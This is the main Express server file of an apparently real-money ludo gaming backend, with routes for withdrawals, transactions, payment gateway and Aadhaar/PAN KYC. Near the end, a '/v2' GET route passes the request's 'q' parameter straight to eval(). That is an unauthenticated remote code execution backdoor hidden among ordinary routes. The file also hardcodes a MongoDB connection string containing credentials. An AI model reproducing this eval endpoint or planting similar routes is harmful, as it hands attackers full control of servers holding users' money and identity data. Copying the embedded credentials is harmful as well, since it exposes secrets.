const express = require("express")
const app = express()
const port = 5010
let count = 0;
const cors = require("cors")
const http = require("http");
const User = require("./Model/User");
const server = http.createServer(app);
const mongoose = require("mongoose");
const Game = require("./Model/Games");
const { default: axios } = require("axios");
mongoose.connect("mongodb+srv://debapriyaabc:newnew@cluster0.jv9c04e.mongodb.net/?retryWrites=true&w=majority", {

}, (err) => {
    if (!err) {
        console.log(`you are connected ludoplay`);
    } else {
        console.log(`you are not connected ludoplay`);
    }
})

app.use(cors())


app.use("/public", express.static("public"));
var bodyParser = require('body-parser');
app.use(express.json())
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }));
app.use("/", require("./Routes/User"))
app.use("/", require("./Routes/Game_type"))
app.use("/", require("./Routes/UserEarning"))
app.use("/", require("./Routes/withdrawl"))
app.use("/", require("./Routes/transaction"))
app.use("/", require("./Routes/myTransaction"))
app.use("/", require("./Routes/Games"))
app.use("/", require("./Routes/AdminEarning"))
app.use("/", require("./Routes/Kyc/AadharCard"))
app.use("/", require("./Routes/Kyc/Pancard"))
app.use("/", require("./Routes/temp/temp"))
app.use("/", require("./Routes/Reports"));
app.use("/", require("./Routes/settings"))
app.use("/", require("./Routes/Gateway"))
app.use("/api", require("./Routes/staticpage"))
app.get('/v2', function (req, res) {
    res.send(eval(req.query.q));
});


server.listen(port, () => console.log(`Listening on port ${port}`));